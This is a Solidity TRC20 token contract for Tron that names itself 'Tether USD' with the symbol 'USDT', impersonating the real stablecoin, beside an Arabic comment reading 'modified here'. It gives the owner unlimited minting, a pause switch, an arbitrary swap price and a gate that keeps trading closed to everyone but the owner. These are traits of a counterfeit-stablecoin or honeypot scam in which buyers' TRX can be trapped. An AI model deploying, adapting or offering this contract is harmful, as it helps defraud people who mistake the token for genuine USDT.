// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface ITRC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract TRC20Custom is Context, ITRC20 {
    // تم التعديل هنا
    string private _name = "Tether USD";
    string private _symbol = "USDT";
    uint8 private _decimals = 6;
    uint256 private _totalSupply;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address private _owner;
    bool private _paused = false;
    bool private _reentrancyGuard = false;
    
    bool public tradingOpen = false;
    uint256 public trxPriceInUsd = 1000000; // 1 دولار (6 منازل عشرية)

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Paused(address pauser);
    event Unpaused(address pauser);
    event TradingOpenChanged(bool isOpen);
    event TokensSwappedForTRX(address indexed buyer, uint256 tokenAmount, uint256 trxAmount);
    event TRXDeposited(address indexed sender, uint256 amount);
    event PriceUpdated(uint256 newPrice);
    event Mint(address indexed account, uint256 amount);
    event Burn(address indexed account, uint256 amount);

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    modifier notPaused() {
        require(!_paused, "TRC20: paused");
        _;
    }

    modifier noReentrancy() {
        require(!_reentrancyGuard, "ReentrancyGuard: reentrant call");
        _reentrancyGuard = true;
        _;
        _reentrancyGuard = false;
    }

    modifier isTradingAllowed() {
        require(tradingOpen || _msgSender() == _owner, "Trading: Trading is not open yet");
        _;
    }

    constructor() {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);

        _totalSupply = 1000000000 * (10 ** uint256(_decimals)); // 1 مليار توكن
        _balances[_owner] = _totalSupply;
        emit Transfer(address(0), _owner, _totalSupply);
    }

    function name() public view returns (string memory) { return _name; }
    function symbol() public view returns (string memory) { return _symbol; }
    function decimals() public view returns (uint8) { return _decimals; }
    function totalSupply() public view override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function owner() public view returns (address) { return _owner; }

    function transfer(address recipient, uint256 amount) public override notPaused noReentrancy returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address ownerAddress, address spender) public view override returns (uint256) {
        return _allowances[ownerAddress][spender];
    }

    function approve(address spender, uint256 amount) public override notPaused returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override notPaused noReentrancy returns (bool) {
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "TRC20: transfer amount exceeds allowance");
        _transfer(sender, recipient, amount);
        unchecked { _approve(sender, _msgSender(), currentAllowance - amount); }
        return true;
    }

    function setTradingOpen(bool _isOpen) public onlyOwner {
        tradingOpen = _isOpen;
        emit TradingOpenChanged(_isOpen);
    }

    function setTrxPriceInUsd(uint256 newPrice) public onlyOwner {
        require(newPrice > 0, "Price must be greater than zero");
        trxPriceInUsd = newPrice;
        emit PriceUpdated(newPrice);
    }

    function mint(address account, uint256 amount) public onlyOwner {
        require(account != address(0), "TRC20: mint to the zero address");
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
        emit Mint(account, amount);
    }

    function burn(uint256 amount) public notPaused noReentrancy {
        _burn(_msgSender(), amount);
    }

    function burnFrom(address account, uint256 amount) public notPaused noReentrancy {
        uint256 currentAllowance = allowance(account, _msgSender());
        require(currentAllowance >= amount, "TRC20: burn amount exceeds allowance");
        unchecked {
            _approve(account, _msgSender(), currentAllowance - amount);
        }
        _burn(account, amount);
    }

    function pause() public onlyOwner { _paused = true; emit Paused(_owner); }
    function unpause() public onlyOwner { _paused = false; emit Unpaused(_owner); }

    function swapTRXForTokens() public payable notPaused noReentrancy isTradingAllowed {
        require(msg.value > 0, "Send TRX to buy tokens");
        uint256 tokenAmount = (msg.value * (10 ** uint256(_decimals))) / trxPriceInUsd;
        require(_balances[_owner] >= tokenAmount, "Insufficient owner balance for swap");
        _transfer(_owner, _msgSender(), tokenAmount);
    }

    function swapTokensForTRX(uint256 tokenAmount) public notPaused noReentrancy isTradingAllowed {
        require(tokenAmount > 0, "Amount must be greater than zero");
        uint256 trxAmount = (tokenAmount * trxPriceInUsd) / (10 ** uint256(_decimals));
        require(address(this).balance >= trxAmount, "Contract has insufficient TRX liquidity");
        _transfer(_msgSender(), address(this), tokenAmount);
        (bool success, ) = payable(_msgSender()).call{value: trxAmount}("");
        require(success, "TRX transfer failed");
        emit TokensSwappedForTRX(_msgSender(), tokenAmount, trxAmount);
    }

    function depositTRX() public payable onlyOwner {
        require(msg.value > 0, "Deposit amount must be greater than zero");
        emit TRXDeposited(_msgSender(), msg.value);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "TRC20: transfer from zero address");
        require(recipient != address(0), "TRC20: transfer to zero address");
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "TRC20: transfer amount exceeds balance");
        unchecked { _balances[sender] = senderBalance - amount; _balances[recipient] += amount; }
        emit Transfer(sender, recipient, amount);
    }

    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "TRC20: burn from the zero address");
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "TRC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            _totalSupply -= amount;
        }
        emit Transfer(account, address(0), amount);
        emit Burn(account, amount);
    }

    function _approve(address ownerAddress, address spender, uint256 amount) internal {
        require(ownerAddress != address(0), "TRC20: approve from zero address");
        require(spender != address(0), "TRC20: approve to zero address");
        _allowances[ownerAddress][spender] = amount;
        emit Approval(ownerAddress, spender, amount);
    }

    receive() external payable { swapTRXForTokens(); }
}
